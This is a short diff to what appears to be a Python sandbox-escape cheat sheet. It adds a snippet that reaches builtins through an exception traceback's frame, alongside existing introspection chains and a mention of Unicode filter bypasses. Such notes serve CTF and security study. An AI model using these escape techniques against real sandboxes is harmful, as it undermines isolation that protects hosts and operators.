@@ -47,6 +47,16 @@ Use Unicode characters that look like ASCII but bypass filters. See [details](./
 - `().__reduce_ex__(2)[0].__globals__`
 - `().__setattr__.__objclass__.__subclasses__()`
 
+When you have access to exception:
+
+```python
+try:
+    1/0
+except Exception as e:
+    print(e.__traceback__.tb_frame.f_builtins)
+    print(e.__traceback__.tb_frame.f_globals["__builtins__"])
+```
+
 ### Numbers and Booleans Without Digits
 
 - **`True`:** Available directly
